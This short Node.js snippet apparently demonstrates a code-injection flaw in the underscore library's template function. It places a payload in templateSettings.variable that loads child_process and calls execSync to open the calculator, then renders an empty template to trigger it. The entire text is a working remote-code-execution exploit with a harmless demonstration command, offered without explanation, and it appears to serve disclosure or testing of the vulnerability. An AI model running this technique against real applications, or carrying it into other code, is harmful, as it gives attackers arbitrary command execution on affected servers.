const _ = require('underscore'); 
_.templateSettings.variable = "a = this.process.mainModule.require('child_process').execSync('open -a calculator')"; 
const t = _.template("")(); 